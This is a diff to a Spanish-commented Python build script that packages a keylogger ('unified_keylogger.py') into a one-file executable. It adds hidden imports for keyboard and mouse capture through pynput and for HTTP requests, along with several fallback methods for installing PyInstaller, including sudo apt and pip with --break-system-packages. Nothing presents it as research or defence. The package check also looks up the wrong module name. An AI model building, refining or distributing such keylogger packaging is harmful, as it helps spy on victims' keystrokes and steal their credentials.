@@ -7,14 +7,67 @@ import os
 import shutil
 
 def install_pyinstaller():
-    """instala pyinstaller si no esta disponible"""
-    try:
-        import PyInstaller
+    """instala pyinstaller si no esta disponible, maneja entornos gestionados"""
+    import importlib.util
+    if importlib.util.find_spec("pyinstaller") is not None:
         print("pyinstaller ya esta instalado")
-    except ImportError:
-        print("instalando pyinstaller...")
+        return True
+    
+    print("instalando pyinstaller...")
+    
+    # metodo 1: intentar con apt (debian/ubuntu/parrot)
+    if shutil.which("apt"):
+        print("detectado sistema debian/ubuntu, intentando con apt...")
+        try:
+            subprocess.run(["sudo", "apt", "update"], check=True, capture_output=True)
+            subprocess.run(["sudo", "apt", "install", "-y", "python3-pyinstaller"], check=True)
+            print("pyinstaller instalado via apt")
+            return True
+        except subprocess.CalledProcessError:
+            print("apt fallo, intentando con pip...")
+    
+    # metodo 2: pip con --break-system-packages (entornos gestionados)
+    try:
+        subprocess.run([
+            sys.executable, "-m", "pip", "install", 
+            "--break-system-packages", "pyinstaller"
+        ], check=True)
+        print("pyinstaller instalado con --break-system-packages")
+        return True
+    except subprocess.CalledProcessError:
+        print("pip con --break-system-packages fallo, intentando pip normal...")
+    
+    # metodo 3: pip normal
+    try:
         subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
-        print("pyinstaller instalado correctamente")
+        print("pyinstaller instalado con pip normal")
+        return True
+    except subprocess.CalledProcessError:
+        print("pip normal fallo, intentando con entorno virtual temporal...")
+    
+    # metodo 4: entorno virtual temporal
+    try:
+        venv_path = "temp_venv"
+        subprocess.run([sys.executable, "-m", "venv", venv_path], check=True)
+        
+        # activar entorno virtual y instalar
+        if os.name == 'nt':  # windows
+            pip_path = os.path.join(venv_path, "Scripts", "pip")
+            python_path = os.path.join(venv_path, "Scripts", "python")
+        else:  # unix/linux
+            pip_path = os.path.join(venv_path, "bin", "pip")
+            python_path = os.path.join(venv_path, "bin", "python")
+        
+        subprocess.run([pip_path, "install", "pyinstaller"], check=True)
+        
+        # actualizar sys.executable para usar el del entorno virtual
+        sys.executable = python_path
+        
+        print("pyinstaller instalado en entorno virtual temporal")
+        return True
+    except subprocess.CalledProcessError:
+        print("error: no se pudo instalar pyinstaller con ningun metodo")
+        return False
 
 def build_executable():
     """compila el keylogger a ejecutable"""
@@ -30,13 +83,17 @@ def build_executable():
     
     # comando de compilacion
     cmd = [
-        "pyinstaller",
+        sys.executable, "-m", "PyInstaller",
         "--onefile",
         "--console",
         "--name=keylogger",
         "--add-data=reconstructor.py:.",
         "--hidden-import=pynput",
+        "--hidden-import=pynput.keyboard",
+        "--hidden-import=pynput.mouse", 
         "--hidden-import=requests",
+        "--hidden-import=urllib3",
+        "--clean",
         "unified_keylogger.py"
     ]
     
@@ -121,7 +178,12 @@ def main():
             return
     
     # instalar pyinstaller
-    install_pyinstaller()
+    if not install_pyinstaller():
+        print("error: no se pudo instalar pyinstaller")
+        print("instalacion manual requerida:")
+        print("sudo apt install python3-pyinstaller")
+        print("o pip install --break-system-packages pyinstaller")
+        return
     
     # compilar ejecutable
     if build_executable():
